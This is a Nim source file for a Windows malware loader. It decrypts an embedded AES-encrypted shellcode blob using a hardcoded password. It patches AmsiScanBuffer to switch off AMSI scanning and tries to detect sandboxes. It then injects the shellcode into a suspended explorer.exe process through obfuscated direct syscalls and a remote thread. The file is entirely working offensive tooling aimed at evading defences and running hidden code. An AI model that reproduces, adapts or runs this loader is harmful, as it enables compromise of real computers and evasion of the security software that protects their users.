import winim/lean
import osproc
include syscalls
import nimcrypto
import base64
import typetraits
import strformat
import dynlib

proc VQZjI4owh6paE29c[byte](shellcode: openArray[byte]): void =

    let 
        TProcess: string = r"C:\Windows\explorer.exe"
    let tProcess = startProcess(TProcess)
    tProcess.suspend() 
    defer: tProcess.close()

    #echo "[*] Target Process: ", TProcess, " ProcessID : ", tProcess.processID

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](shellcode.len)

    cid.UniqueProcess = tProcess.processID

    var status = WKRCkaRldCsEeLhg(
        &pHandle,
        PROCESS_ALL_ACCESS, 
        &oa, &cid         
    )

    echo "[*] pHandle: ", pHandle

    status = TWIzGBaAgPFqsdFU(
        pHandle, &ds, 0, &sc_size, 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE);

    var bytesWritten: SIZE_T

    status = qrSXNlcuNvOinDzz(
        pHandle, 
        ds, 
        unsafeAddr shellcode, 
        sc_size-1, 
        addr bytesWritten);

    #echo "[*] WriteProcessMemory: ", status
    #echo "    \\-- bytes written: ", bytesWritten
    #echo ""

    status = kyeeWVCPRaEkBSTl(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        NULL, 
        pHandle,
        ds, 
        NULL, FALSE, 0, 0, 0, NULL);

    status = xJLSTCNVOYeeSusQ(tHandle)
    status = xJLSTCNVOYeeSusQ(pHandle)

    #echo "[*] tHandle: ", tHandle
    echo "[+] Injected"

proc isEmulated(): bool =
    echo "[?] Escaping sanbox by trying to call VirtualAllocExNuma"
    let mem = VirtualAllocExNuma(
        GetCurrentProcess(),
        NULL,
        0x1000,
        0x3000, # MEM_COMMIT | MEM_RESERVE
        0x20, # PAGE_EXECUTE_READ
        0)

    if isNil(mem):
        return true
    return false

when defined(windows):

    when defined(i386):
        echo "[!] This is only for 64-bit use. Exiting..."
        return 

    elif defined(amd64):
        echo "[*] Running in x64 process"
        const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]


    proc PatchAmsi(): bool =
        var
            amsi: LibHandle
            cs: pointer
            op: DWORD
            t: DWORD
            disabled: bool = false

        # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
        # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
        amsi = loadLib("amsi")
        if isNil(amsi):
            echo "[X] Failed to load amsi.dll"
            return disabled

        cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
        if isNil(cs):
            echo "[X] Failed to get the address of 'AmsiScanBuffer'"
            return disabled

        if VirtualProtect(cs, patch.len, 0x40, addr op):
            echo "[*] Applying patch"
            copyMem(cs, unsafeAddr patch, patch.len)
            VirtualProtect(cs, patch.len, op, addr t)
            disabled = true

        return disabled


    # Check if we're in a sandbox by calling a rare-emulated API
    if isEmulated():
        echo "[-] VirtualAllocExNuma did not pass the check, you're probably in a sandbox... Exiting"
        quit()


    when isMainModule:
        func toByteSeq*(str: string): seq[byte] {.inline.} = @(str.toOpenArrayByte(0, str.high))

        let
            password: string = "4Uh15pjsdip2oQJE"
            ivB64: string = "cog8DLA8w0khVrwCViGsfw=="
            encB64: string = "gPCP9OOoGsTCXf84IdLljoiLGaq3Fpx0jEjxeCUZADqCTSXgRfMGJWxDzzOTORXWhPH+2MHqfnvDFKfl5wWVDkeUYxrgRLGyKx8ei0opkT0Lya4Yy5NnwksuM7lxJW9nOV1fHJZ4qpb7zMpszAR3GRGVQJXde4xsRHpNhaE0QXg74nHLip4+zv/SvD4l52+GKVBgx4XQyoqV6vx9Dp1c6tdef1WrpWyDIlRtINWkfOWkDvh/I5fhjOeMHlyiap+kn7IRvTk2/zR8YeYFX2w34HIRiq4+BKFkVztomTpLn7MI4r7be7qNbAQ8jqeOfRIQLb5kzAF0EqTwatn3a7rmNt2j51V/Ib/r0/BDPhb5STz13kv+zt7Q5JKOxsIo5b5bLEAAWyYhpo+Hm5NjpMH7PVjfxr8EpU1KoGybGbJmNHEmHClIVdEyp+E4ZaU6/AcCbG8jQ9INL1ObHq5dc7FFV2HxKX9gO2ULz74Tzd6j8Zz5bLFBEKy62+JyRIvBbivEzOHNSQ0aIjtBTHzUEwvKnXPnvcoN9Yx3vtiaM1F6gX7K94r6CO1sWisj1P5s5r3x2521FDFXzBw2XwuSyjoJkmc4G2QhHkwISlZ+tqO647Kk67JCBaBUCVTzY1zHIfqd7UyYU/wsO+JgsH90ZKiiMWrxMRam6prVvmv7PWi1"
    
        var
            ctx: CTR[aes256]
            key: array[aes256.sizeKey, byte]
            iv: seq[byte] = toByteSeq(decode(ivB64))
            enc: seq[byte] = toByteSeq(decode(encB64))
            dec: seq[byte] = newSeq[byte](len(enc))

        var expKey = sha256.digest(password)
        copyMem(addr key[0], addr expKey.data[0], len(expKey.data))
        ctx.init(key, iv)
        echo "[*] Decrypting your shellcode..."
        ctx.decrypt(enc, dec)
        ctx.clear()

        var success = PatchAmsi()
        echo fmt"[*] AMSI disabled: {bool(success)}"

        VQZjI4owh6paE29c(dec)